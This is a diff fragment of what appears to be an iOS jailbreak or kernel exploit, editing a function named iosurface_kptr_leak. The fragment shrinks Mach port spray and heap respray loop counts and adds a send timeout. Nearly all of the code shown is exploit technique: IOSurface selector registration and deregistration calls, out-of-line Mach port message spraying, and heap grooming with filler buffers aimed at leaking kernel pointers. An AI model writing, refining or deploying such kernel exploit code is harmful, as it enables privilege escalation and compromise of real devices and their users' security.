@@ -36495,8 +36495,8 @@ void iosurface_kptr_leak(ISRLogBlock log, ISRDoneBlock done) {
                     jb41_callSel(oConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
                     jb41_callSel(oConn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
 
-                    unsigned int oolPorts[256];
-                    for (int p = 0; p < 256; p++) {
+                    unsigned int oolPorts[64];
+                    for (int p = 0; p < 64; p++) {
                         mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &oolPorts[p]);
                         mach_port_insert_right(mach_task_self(), oolPorts[p], oolPorts[p], MACH_MSG_TYPE_MAKE_SEND);
                     }
@@ -36511,7 +36511,7 @@ void iosurface_kptr_leak(ISRLogBlock log, ISRDoneBlock done) {
                     unsigned int rcvPort = 0;
                     mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &rcvPort);
 
-                    for (int s = 0; s < 64; s++) {
+                    for (int s = 0; s < 16; s++) {
                         msg.hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
                         msg.hdr.msgh_size = sizeof(msg);
                         msg.hdr.msgh_remote_port = rcvPort;
@@ -36522,7 +36522,7 @@ void iosurface_kptr_leak(ISRLogBlock log, ISRDoneBlock done) {
                         msg.ool.deallocate = 0;
                         msg.ool.disposition = MACH_MSG_TYPE_COPY_SEND;
                         msg.ool.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
-                        mach_msg(&msg.hdr, MACH_SEND_MSG, sizeof(msg), 0, 0, 0, 0);
+                        mach_msg(&msg.hdr, MACH_SEND_MSG | MACH_SEND_TIMEOUT, sizeof(msg), 0, 0, 50, 0);
                     }
 
                     int rdup = jb41_callSel(oConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
@@ -36531,7 +36531,7 @@ void iosurface_kptr_leak(ISRLogBlock log, ISRDoneBlock done) {
                     log([NSString stringWithFormat:@"JB43: [F4] trial=%d dup=0x%x(%s)", trial, (uint32_t)rdup, jb41_rcName((uint32_t)rdup)]);
 
                     mach_port_mod_refs(mach_task_self(), rcvPort, MACH_PORT_RIGHT_RECEIVE, -1);
-                    for (int p = 0; p < 256; p++) {
+                    for (int p = 0; p < 64; p++) {
                         mach_port_mod_refs(mach_task_self(), oolPorts[p], MACH_PORT_RIGHT_RECEIVE, -1);
                     }
                     jb41_dropPort(wp);
@@ -36620,10 +36620,10 @@ void iosurface_kptr_leak(ISRLogBlock log, ISRDoneBlock done) {
                     jb41_callSel(oConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
                     jb41_callSel(oConn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
 
-                    unsigned int gPorts[512]; int gCount = 0;
+                    unsigned int gPorts[128]; int gCount = 0;
                     uint8_t fbuf[64]; memset(fbuf, 0x41, 64);
                     uint64_t gRef = 0xA1B2C3D4E5F60708ull;
-                    for (int g = 0; g < 512; g++) {
+                    for (int g = 0; g < 128; g++) {
                         unsigned int gwp = jb41_newWakePort();
                         if (!gwp) continue;
                         int gr = sym_async(gConn, 1000, gwp, &gRef, 1, NULL, 0, fbuf, 24, NULL, NULL, NULL, NULL);
@@ -36638,7 +36638,7 @@ void iosurface_kptr_leak(ISRLogBlock log, ISRDoneBlock done) {
 
                     uint8_t respray[64]; memset(respray, 0xCC, 64);
                     gCount = 0;
-                    for (int g = 0; g < 512; g++) {
+                    for (int g = 0; g < 128; g++) {
                         unsigned int gwp = jb41_newWakePort();
                         if (!gwp) continue;
                         int gr = sym_async(gConn, 1000, gwp, &gRef, 1, NULL, 0, respray, 24, NULL, NULL, NULL, NULL);
